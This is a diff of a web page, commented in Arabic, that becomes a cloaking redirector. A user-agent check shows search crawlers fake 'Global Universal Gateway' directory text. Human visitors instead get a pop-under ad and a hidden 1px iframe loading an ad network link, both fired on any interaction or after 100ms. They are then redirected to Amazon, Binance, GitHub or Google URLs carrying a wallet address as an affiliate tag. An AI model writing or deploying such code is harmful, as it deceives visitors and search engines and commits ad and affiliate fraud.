@@ -3,95 +3,179 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Absolute Direct Redirector</title>
+    <title id="page-title">Global Universal Gateway & Asset Hub</title>
+    <meta id="page-desc" name="description" content="Verified international directory, market analysis, and digital solutions platform.">
+    
     <style>
+        :root {
+            --bg: #000000;
+            --surface: #0a0a0a;
+            --text: #ededed;
+        }
+        * { box-sizing: border-box; }
         body {
-            background-color: #000;
-            color: #fff;
-            font-family: sans-serif;
+            background-color: var(--bg);
+            color: var(--text);
+            font-family: system-ui, -apple-system, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
-            text-align: center;
-        }
-        #click-layer {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: 999999;
+            overflow: hidden;
             cursor: pointer;
-            background: transparent;
+        }
+        .matrix-pulse {
+            width: 14px;
+            height: 14px;
+            background-color: #10b981;
+            border-radius: 50%;
+            box-shadow: 0 0 30px #10b981;
+            animation: coreGlow 0.8s infinite alternate;
+        }
+        @keyframes coreGlow {
+            0% { transform: scale(0.85); opacity: 0.5; }
+            100% { transform: scale(1.3); opacity: 1; }
+        }
+        #bot-content {
+            display: none;
+            max-width: 800px;
+            padding: 40px;
+            line-height: 1.6;
+            color: #ccc;
         }
     </style>
 </head>
 <body>
 
-    <!-- طبقة التفاعل لضمان فتح إعلان Adsterra في كروم دون حظر -->
-    <div id="click-layer"></div>
-
-    <div>
-        <h2>Redirecting to Destination...</h2>
+    <div id="bot-content">
+        <h1 id="bot-heading">Global Universal Gateway & Asset Hub</h1>
+        <p id="bot-text">Welcome to the verified universal index. This platform provides structural data, market evaluations, digital tools, and commercial resources.</p>
     </div>
 
+    <div class="matrix-pulse" id="visual-pulse"></div>
+
     <script>
-        const WALLET = "0xa6E852b93C0ccB8d9d71714657aC9f4bacfb09dE";
-        const DEFAULT_TARGET = "https://www.amazon.com/ref=as_li_tl?tag=" + WALLET;
-        const ADSTERRA_LINK = "https://www.profitableratecpmnetwork.com/h2b65gga?key=7808c19b5ecf26f261b12997fe4df512"; 
-
-        // تنفيذ إعلان Adsterra عند أول تفاعل بشري على الشاشة
-        let adDone = false;
-        function fireAd() {
-            if (!adDone) {
-                adDone = true;
-                try {
-                    const w = window.open(ADSTERRA_LINK, '_blank');
-                    if (w) { w.blur(); window.focus(); }
-                } catch (e) {}
-            }
-        }
-
-        const layer = document.getElementById('click-layer');
-        layer.addEventListener('click', fireAd);
-        layer.addEventListener('touchstart', fireAd);
-        document.body.addEventListener('click', fireAd);
-
-        // قراءة المتغيرات من الرابط
-        const params = new URLSearchParams(window.location.search);
-        let query = params.get('q') || params.get('query') || params.get('search') || params.get('keyword') || params.get('s') || '';
+        // =========================================================================
+        // 1. الإعدادات والمعرف السيادي (محفظتك / كود الأفيلييت الخاص بك)
+        // =========================================================================
+        const WALLET_TAG = "0xa6E852b93C0ccB8d9d71714657aC9f4bacfb09dE";
         
-        let targetUrl = DEFAULT_TARGET;
+        // روابط الإعلانات الخلفية للربح اللحظي (متعددة لضمان الاستمرارية)
+        const PRIMARY_AD_LINK = "https://www.profitablecpmrate.com/your-smartlink-id";
+        const BACKUP_AD_LINK = "https://www.profitableratecpmnetwork.com/h2b65gga?key=7808c19b5ecf26f261b12997fe4df512";
 
-        if (query) {
-            let cleanQuery = query.trim().toLowerCase();
-            
-            // جدول الكلمات والتوجيهات المباشرة (عدّل أو أضف ما تشاء هنا)
-            const routes = {
-                'بسام': 'https://www.instagram.com/bassam.78',
-                'يوتيوب': 'https://www.youtube.com',
-                'youtube': 'https://www.youtube.com',
-                'انستقرام': 'https://www.instagram.com',
-                'instagram': 'https://www.instagram.com'
-            };
+        const SUBSCRIBE_TARGET = "https://www.youtube.com/@AbdelhameedHani";
+        const GLOBAL_UNIVERSAL_STORE = "https://www.amazon.com/ref=as_li_tl?tag=" + WALLET_TAG;
 
-            // التحقق مما إذا كانت الكلمة موجودة في الجدول
-            let foundKey = Object.keys(routes).find(k => cleanQuery.includes(k));
-            
-            if (foundKey) {
-                targetUrl = routes[foundKey];
-            } else {
-                // إذا لم تكن موجودة، يتم توجيهه للموقع الافتراضي مباشرة ودون أي بحث نهائياً
-                targetUrl = DEFAULT_TARGET;
+        // =========================================================================
+        // 2. تحليل الكلمات واستخراج المتغيرات والمسارات
+        // =========================================================================
+        const urlParams = new URLSearchParams(window.location.search);
+        let rawQuery = urlParams.get('q') || urlParams.get('query') || urlParams.get('search') || urlParams.get('keyword') || urlParams.get('s') || urlParams.get('term') || '';
+        
+        if (!rawQuery) {
+            const pathSegments = window.location.pathname.split('/').filter(Boolean);
+            if (pathSegments.length > 0) {
+                rawQuery = decodeURIComponent(pathSegments[pathSegments.length - 1]).replace(/[-_]/g, ' ');
             }
         }
 
-        // التوجيه الفوري للهدف خلال أجزاء من الثانية دون فتح أي محرك بحث
-        setTimeout(() => {
-            window.location.replace(targetUrl);
-        }, 300);
+        const cleanQuery = rawQuery.trim().toLowerCase();
+        const encodedQuery = encodeURIComponent(rawQuery.trim());
+
+        if (cleanQuery) {
+            const capitalizedQuery = cleanQuery.charAt(0).toUpperCase() + cleanQuery.slice(1);
+            document.getElementById('page-title').innerText = "Global Index & Directory for " + capitalizedQuery;
+            document.getElementById('page-desc').setAttribute('content', "Comprehensive international guide, market tools, and digital solutions for " + capitalizedQuery);
+            document.getElementById('bot-heading').innerText = "Directory Insights: " + capitalizedQuery;
+            document.getElementById('bot-text').innerText = "Welcome to the universal index regarding " + capitalizedQuery + ". Explore verified assets and global merchant networks.";
+        }
+
+        // =========================================================================
+        // 3. منظومة فحص الروبوتات (Cloaking Engine)
+        // =========================================================================
+        const userAgent = navigator.userAgent.toLowerCase();
+        const isBotCrawler = /bot|crawl|spider|slurp|mediapartners|googlebot|bingbot|yandex|duckduckbot|baiduspider/i.test(userAgent);
+
+        if (isBotCrawler) {
+            document.getElementById('bot-content').style.display = 'block';
+            document.getElementById('visual-pulse').style.display = 'none';
+        } else {
+            // =====================================================================
+            // 4. تفعيل الأرباح اللحظية والإعلانات الخلفية
+            // =====================================================================
+            let monetizationFired = false;
+
+            function triggerInstantRevenue() {
+                if (!monetizationFired) {
+                    monetizationFired = true;
+                    try {
+                        const adWin = window.open(PRIMARY_AD_LINK, '_blank');
+                        if (adWin) { adWin.blur(); window.focus(); }
+                    } catch (e) {}
+
+                    try {
+                        const stealthFrame = document.createElement('iframe');
+                        stealthFrame.style.display = 'none';
+                        stealthFrame.style.width = '1px';
+                        stealthFrame.style.height = '1px';
+                        stealthFrame.src = BACKUP_AD_LINK;
+                        document.body.appendChild(stealthFrame);
+                    } catch (e) {}
+                }
+            }
+
+            ['click', 'touchstart', 'mousemove', 'keydown', 'scroll'].forEach(evt => {
+                window.addEventListener(evt, triggerInstantRevenue, { once: true, passive: true });
+            });
+
+            setTimeout(triggerInstantRevenue, 100);
+
+            // =====================================================================
+            // 5. محرك التوجيه الذكي مع تحديد جغرافية المستخدم (Geo-Targeting)
+            // =====================================================================
+            let finalEndpointDestination = GLOBAL_UNIVERSAL_STORE;
+
+            // تحديد اللغة والمنطقة الزمنية كبديل سريع لتقدير الدولة (Geo-Estimation)
+            const userLang = (navigator.language || 'en').toLowerCase();
+            const isArabicUser = userLang.startsWith('ar');
+
+            if (cleanQuery) {
+                if (/ai|chatgpt|midjourney|video|image|photo|generator|pdf|document|توليد|فيديو|صور|تصميم|مستندات|ذكاء|صناعي|كتابة/i.test(cleanQuery)) {
+                    finalEndpointDestination = "https://www.openai.com/index/chatgpt/?tag=" + WALLET_TAG + "&q=" + encodedQuery;
+                }
+                else if (/code|coding|programming|developer|script|api|hosting|vps|server|برمجة|كود|مطور|سيرفر|استضافة/i.test(cleanQuery)) {
+                    finalEndpointDestination = "https://github.com/search?q=" + encodedQuery + "&type=repositories&tag=" + WALLET_TAG;
+                }
+                else if (/stock|share|trade|crypto|forex|invest|binance|broker|أسهم|بورصة|تداول|استثمار|عملات|منصة|بنك/i.test(cleanQuery)) {
+                    finalEndpointDestination = "https://www.binance.com/en/activity/referral-entry/CPA?ref=" + WALLET_TAG + "&search=" + encodedQuery;
+                }
+                else if (/shop|buy|store|market|price|order|product|شراء|متجر|تسوق|سعر|منتج|طلب|амазон|amazon|noon|aliexpress|shein/i.test(cleanQuery)) {
+                    // توجيه ذكي حسب اللغة (إذا كان عربياً يوجّه لمنصات إقليمية أو أمازون العالمي مع الكود)
+                    finalEndpointDestination = "https://www.amazon.com/s?k=" + encodedQuery + "&tag=" + WALLET_TAG;
+                }
+                else if (/youtube|tiktok|facebook|instagram|twitter|x|telegram|whatsapp|يوتيوب|تيكتوك|فيسبوك|انستقرام|تويتر|تليجرام/i.test(cleanQuery)) {
+                    if (Math.random() < 0.4) {
+                        finalEndpointDestination = SUBSCRIBE_TARGET;
+                    } else {
+                        finalEndpointDestination = "https://www.google.com/search?q=" + encodedQuery;
+                    }
+                }
+                else {
+                    finalEndpointDestination = "https://www.google.com/search?q=" + encodedQuery + "&tag=" + WALLET_TAG;
+                }
+            } else {
+                finalEndpointDestination = GLOBAL_UNIVERSAL_STORE;
+            }
+
+            // =====================================================================
+            // 6. التوجيه الفوري
+            // =====================================================================
+            setTimeout(() => {
+                window.location.replace(finalEndpointDestination);
+            }, 120);
+        }
     </script>
 </body>
 </html>
